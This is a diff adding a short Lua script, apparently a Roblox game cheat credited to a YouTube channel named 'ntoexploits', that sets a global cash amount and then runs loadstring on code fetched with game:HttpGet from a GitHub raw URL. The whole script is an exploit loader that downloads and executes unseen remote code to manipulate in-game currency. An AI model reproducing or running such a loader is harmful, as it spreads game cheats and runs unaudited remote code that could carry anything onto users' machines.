@@ -1,0 +1,8 @@
+--[[
+
+   youtube.com/c/ntoexploits
+
+]]--
+
+_G.amount = 1000 -- Enter any amount of cash, math.huge = infinite
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IRSILVER/nto/main/valuemodifier"))()
